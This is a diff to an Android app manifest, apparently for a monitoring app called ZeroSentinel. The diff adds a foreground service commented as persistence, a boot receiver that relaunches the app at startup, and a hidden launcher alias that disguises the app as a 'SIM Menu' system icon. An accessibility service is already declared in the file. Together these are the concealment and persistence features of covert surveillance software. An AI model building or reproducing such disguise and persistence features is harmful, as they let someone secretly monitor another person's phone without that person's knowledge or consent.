@@ -36,16 +36,50 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
+        <!-- Foreground Service (Persistence) -->
+        <service
+            android:name=".services.SentinelService"
+            android:foregroundServiceType="specialUse"
+            android:exported="false">
+             <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                       android:value="parental_control_monitoring" />
+        </service>
+
+        <!-- Boot Receiver -->
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
         <!-- Main Activity (Wizard) -->
         <activity
             android:name=".ui.MainActivity"
             android:exported="true"
-            android:theme="@style/Theme.ZeroSentinel">
+            android:theme="@style/Theme.ZeroSentinel"
+            android:enabled="true"> <!-- Default Enabled -->
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+
+        <!-- Stealth Alias (Hidden/Disguised) -->
+        <activity-alias
+            android:name=".ui.StealthAlias"
+            android:targetActivity=".ui.MainActivity"
+            android:label="SIM Menu"
+            android:icon="@drawable/ic_sim_menu"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
 
     </application>
 
